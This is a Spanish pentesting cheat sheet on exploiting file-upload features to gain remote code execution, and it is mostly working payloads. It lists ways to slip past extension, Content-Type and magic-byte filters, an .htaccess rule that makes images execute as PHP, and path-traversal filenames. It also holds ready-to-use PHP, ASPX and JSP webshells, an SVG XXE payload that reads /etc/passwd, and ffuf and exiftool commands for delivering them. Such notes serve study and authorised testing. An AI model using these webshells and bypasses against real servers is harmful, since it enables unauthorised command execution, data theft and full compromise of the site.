---
tags: [web, file-upload, rce]
status: done
---

# File Upload

---

## Objetivo

Subir un fichero ejecutable (webshell, PHP, JSP...) que el servidor procese → RCE.

---

## Checklist Inicial

```
1. ¿Qué extensiones acepta? → .jpg, .png, .gif, .pdf...
2. ¿Cómo valida el tipo? → Content-Type, extensión, magic bytes, o todo?
3. ¿Dónde se almacena? → ¿ruta predecible y accesible web?
4. ¿Procesa el contenido? → resize de imagen, antivirus, análisis?
```

---

## Bypass de Extensión

```
# Extensiones alternativas PHP
.php → .php3 .php4 .php5 .phtml .pht .php7 .phps

# ASP/ASPX
.asp → .asa .cer .aspx

# JSP
.jsp → .jspx .jsw .jsv

# Doble extensión
shell.php.jpg
shell.jpg.php
shell.php%00.jpg    # Null byte (PHP < 5.4)
shell.php           → renombrado → shell.php.jpg → probar shell.php\x00.jpg

# Case sensitivity
shell.PHP
shell.PhP
```

---

## Bypass de Content-Type

```
# La validación solo mira el Content-Type header → cambiarlo en Burp
Content-Type: image/jpeg   (con contenido PHP)

# Mantener cabecera de imagen + añadir PHP al final
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

## Bypass de Magic Bytes

```php
# Magic bytes de GIF al inicio del archivo PHP
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php

# Para PNG: primeros 8 bytes del PNG header
python3 -c "
import sys
png_header = b'\x89PNG\r\n\x1a\n'
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
sys.stdout.buffer.write(png_header + payload)
" > shell.png.php
```

---

## Bypass via .htaccess

```
# Si se puede subir .htaccess → hacer que el servidor ejecute .jpg como PHP
# Contenido del .htaccess:
AddType application/x-httpd-php .jpg

# Después subir shell.jpg → se ejecuta como PHP
```

---

## Webshells Útiles

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_POST['cmd']); ?>

# Más evasiva
<?php $f=$_GET[0];echo `$f`; ?>

# PHP 8 (sin comillas)
<?=`{$_GET[0]}`?>
```

```aspx
<!-- ASPX webshell básico -->
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>
```

```jsp
<!-- JSP -->
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

---

## Path Traversal en Upload

```
# Si el nombre de archivo se usa en la ruta de destino
filename=../../var/www/html/shell.php
filename=../shell.php
filename=%2e%2e%2fshell.php
```

---

## Upload → XXE (SVG)

```xml
<!-- Si el servidor procesa SVG -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

---

## Herramientas

```bash
# Fuzz de extensiones con ffuf
ffuf -u "https://target.com/upload" \
     -X POST \
     -F "file=@shell.FUZZ;type=image/jpeg" \
     -w extensions.txt \
     -mc 200

# exiftool — incrustar PHP en metadatos de imagen real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
mv imagen.jpg shell.php.jpg
```

